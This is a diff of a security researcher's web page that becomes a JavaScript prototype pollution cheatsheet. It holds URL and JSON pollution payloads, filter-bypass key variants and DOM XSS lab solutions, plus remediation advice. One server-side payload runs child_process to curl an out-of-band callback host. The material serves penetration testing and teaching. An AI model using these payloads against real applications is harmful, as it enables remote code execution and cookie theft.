@@ -12,13 +12,13 @@
         <meta name="author" content="Tom Fieber">
       
       
-        <link rel="canonical" href="https://tomfieber.dev/resources/methodology/cheatsheets/xpath-injection/">
+        <link rel="canonical" href="https://tomfieber.dev/resources/methodology/cheatsheets/prototype-pollution/">
       
       
-        <link rel="prev" href="../tls/">
+        <link rel="prev" href="../open-redirects/">
       
       
-        <link rel="next" href="../xss/">
+        <link rel="next" href="../recon/">
       
       
         
@@ -29,7 +29,7 @@
     
     
       
-        <title>XPath Injection - Tom Fieber (@pawpawhacks)</title>
+        <title>JavaScript Prototype Pollution - Tom Fieber (@pawpawhacks)</title>
       
     
     
@@ -152,7 +152,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#xpath-injection" class="md-skip">
+        <a href="#javascript-prototype-pollution" class="md-skip">
           Skip to content
         </a>
       
@@ -185,7 +185,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              XPath Injection
+              JavaScript Prototype Pollution
             
           </span>
         </div>
@@ -1030,10 +1030,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../prototype-pollution/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JavaScript Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1049,6 +1076,82 @@
   
 
       </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#via-json" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Via JSON
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-side-prototype-pollution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server-side prototype pollution
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#code-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Code review
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#portswigger" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PortSwigger
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1198,19 +1301,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../xpath-injection/" class="md-nav__link">
         
   
   
@@ -1226,7 +1320,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -1469,6 +1562,69 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#via-json" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Via JSON
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-side-prototype-pollution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server-side prototype pollution
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#code-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Code review
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#portswigger" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PortSwigger
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -1577,41 +1733,190 @@
   
 
 
-<h1 id="xpath-injection">XPath Injection</h1>
-<p>XPath injection is similar to SQL injection except for:</p>
-<ul>
-<li>It can only be used to read data, not to insert data</li>
-<li>It does not implement any access control, so if you find an injection point it's likely possible to get the whole document.</li>
+<h1 id="javascript-prototype-pollution">JavaScript Prototype Pollution</h1>
+<p>Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Component</strong></th>
+<th><strong>Role</strong></th>
+<th><strong>Common Examples</strong></th>
+<th><strong>Code Example</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Source</strong></td>
+<td><strong>The Entry Point.</strong><br><br>  <br><br>Where untrusted input enters the application and is dangerously merged into an object.</td>
+<td>• recursive merge functions<br><br>  <br><br>• URL query parsers (e.g., <code>qs</code>, <code>minimist</code>)<br><br>  <br><br>• JSON payload handlers</td>
+<td><code>merge(target, JSON.parse(userInput))</code><br><br>  <br><br><em>Input: <code>{"__proto__": {"debug": true}}</code></em></td>
+</tr>
+<tr>
+<td><strong>Gadget</strong></td>
+<td><strong>The "Sleeper Agent."</strong><br><br>  <br><br>Legitimate code that looks for a property, finds it undefined, and falls back to the polluted prototype.</td>
+<td>• Configuration loaders<br><br>  <br><br>• "Option" objects in libraries<br><br>  <br><br>• <code>if (config.isAdmin)</code> checks</td>
+<td>`const shell = options.shell</td>
+</tr>
+<tr>
+<td><strong>Sink</strong></td>
+<td><strong>The Execution Zone.</strong><br><br>  <br><br>The dangerous function where the gadget eventually feeds the polluted data to cause harm.</td>
+<td>• <strong>Client:</strong> <code>innerHTML</code>, <code>document.write</code><br><br>  <br><br>• <strong>Server:</strong> <code>child_process.spawn</code>, <code>eval</code>, <code>vm.runInNewContext</code></td>
+<td><code>child_process.spawn(shell, ...)</code><br><br>  <br><br><em>Executes the polluted command, leading to RCE.</em></td>
+</tr>
+<tr>
+<td>## Sources</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>### Via the URL</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>test.com/?__proto__[foo]=bar
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>?__proto__[polluted]=true
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>?constructor[prototype][polluted]=true
+</span></code></pre></div>
+<h3 id="via-json">Via JSON</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>{
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    &quot;__proto__&quot;: {
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>        &quot;evilProperty&quot;: &quot;payload&quot;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    }
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>}
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{&quot;__proto__&quot;: {&quot;polluted&quot;: true}}
+</span></code></pre></div>
+<p>Bypass</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;polluted&quot;: true}}}
+</span></code></pre></div>
+<h2 id="server-side-prototype-pollution">Server-side prototype pollution</h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Try to override the default error status code</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Try JSON spaces override</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Try a charset override</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Check for OOB interactions</li>
 </ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&quot;__proto__&quot;:{
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    &quot;status&quot;:599
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>}
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&quot;__proto__&quot;: { &quot;shell&quot;:&quot;node&quot;, &quot;NODE_OPTIONS&quot;:&quot;--inspect=YOUR-COLLABORATOR-ID.oastify.com\&quot;\&quot;.oastify\&quot;\&quot;.com&quot; }
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&quot;__proto__&quot;: {
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    &quot;execArgv&quot;:[
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>        &quot;--eval=require(&#39;child_process&#39;).execSync(&#39;curl https://1w2bdz4e6oa00ytizquj0kwiyekgu7jl2.oast.site&#39;)&quot;
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    ]
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>}
+</span></code></pre></div>
+<h2 id="code-review">Code review</h2>
+<p>Look for</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> merge</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> extend</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> deepCopy</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> defaults</li>
+</ul>
+<p>Also check for assignment loops</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>target[key] = source[key]
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Check for flawed key sanitization</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>/?__pro__proto__to__.foo=bar
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>/?__pro__proto__to__[foo]=bar 
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>/?__pro__proto__to__.foo=bar 
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>/?constconstructorructor[protoprototypetype][foo]=bar 
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>/?constconstructorructor.protoprototypetype.foo=bar
+</span></code></pre></div>
+<h2 id="portswigger">PortSwigger</h2>
+<details class="exmaple">
+<summary>DOM XSS via client-side prototype pollution</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>0a2c00e903b91645815ec10100cd001c.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);//
+</span></code></pre></div>
+</details>
+<details class="example">
+<summary>DOM XSS via an alternative prototype pollution vector</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>0a0c00d404f574ab83fae7a3002500bd.web-security-academy.net/?__proto__.sequence=alert(1)-
+</span></code></pre></div>
+</details>
+<details class="example">
+<summary>Lab 3</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>0a39008e04e67439842b054b00190057.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1);//
+</span></code></pre></div>
+</details>
+<details class="example">
+<summary>Client-side prototype pollution in third-party libraries</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>&lt;script&gt;
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>    location=&quot;https://0a6d00bc03d6c8ff82742a6100fd005d.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29&quot;
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>&lt;/script&gt;
+</span></code></pre></div>
+</details>
+<details class="example">
+<summary>Client-side prototype pollution via browser APIs</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>0ad3005503235e1182dfca4b00bc000b.web-security-academy.net/?__proto__[value]=data:,alert(1)
+</span></code></pre></div>
+</details>
+<details class="example">
+<summary>Bypassing flawed input filters for server-side prototype pollution</summary>
+<p>Use the constructor instead of <code>__proto__</code>.</p>
+</details>
+<h2 id="remediation">Remediation</h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Use a <code>MAP</code> instead of an <code>Object</code>.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Use the "Null" object. This creates objects that have no prototype</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Freeze the prototype -- Makes the prototype read-only, but can break older libraries that modify the prototype internally. </li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Input validation can be used, but can often be trivially bypassed. Last resort.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>Strategy</strong></th>
+<th><strong>Recommendation</strong></th>
+<th><strong>Implementation Example</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. Use Safe Data Structures</strong></td>
+<td><strong>High Priority.</strong> Use <code>Map</code> for key-value storage instead of plain objects.</td>
+<td><code>let cache = new Map();</code></td>
+</tr>
+<tr>
+<td><strong>2. Null-Prototype Objects</strong></td>
+<td><strong>High Priority.</strong> Create objects that do not inherit from <code>Object.prototype</code>.</td>
+<td><code>let obj = Object.create(null);</code></td>
+</tr>
+<tr>
+<td><strong>3. Schema Validation</strong></td>
+<td><strong>Medium Priority.</strong> Use libraries like Joi or Ajv to strictly define allowed JSON structures.</td>
+<td>Ensure schema does not allow arbitrary keys.</td>
+</tr>
+<tr>
+<td><strong>4. Input Sanitization</strong></td>
+<td><strong>Immediate Patch.</strong> Block dangerous keys in merge functions.</td>
+<td>`if (key === '<strong>proto</strong>'</td>
+</tr>
+<tr>
+<td><strong>5. Object Freezing</strong></td>
+<td><strong>Defense in Depth.</strong> Prevent any changes to the prototype. (Test thoroughly!)</td>
+<td><code>Object.freeze(Object.prototype);</code></td>
+</tr>
+</tbody>
+</table>
 
 
-  <nav class="md-tags" >
-    
-      
-      
-      
-      
-        <span class="md-tag">xpath</span>
-      
-    
-      
-      
-      
-      
-        <span class="md-tag">injection</span>
-      
-    
-  </nav>
 
 
 
 
 
 
-
-
-  
-  
 
 
 
@@ -1643,7 +1948,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../tls/" class="md-footer__link md-footer__link--prev" aria-label="Previous: TLS Handshake">
+          <a href="../open-redirects/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Open redirects">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
@@ -1653,20 +1958,20 @@
                 Previous
               </span>
               <div class="md-ellipsis">
-                TLS Handshake
+                Open redirects
               </div>
             </div>
           </a>
         
         
           
-          <a href="../xss/" class="md-footer__link md-footer__link--next" aria-label="Next: Cross-Site Scripting (XSS)">
+          <a href="../recon/" class="md-footer__link md-footer__link--next" aria-label="Next: Recon">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                Cross-Site Scripting (XSS)
+                Recon
               </div>
             </div>
             <div class="md-footer__button md-icon">
